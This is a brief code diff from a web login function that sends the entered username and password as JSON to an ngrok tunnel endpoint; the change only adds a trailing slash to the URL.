@@ -3,7 +3,7 @@ function login(){
   var username = document.getElementById('username').value;
   var password = document.getElementById('password').value;
 
-  fetch("https://ayla-ropier-consuela.ngrok-free.dev",{
+  fetch("https://ayla-ropier-consuela.ngrok-free.dev/",{
     method : "POST",
     headers: {
             "Content-Type": "application/json"
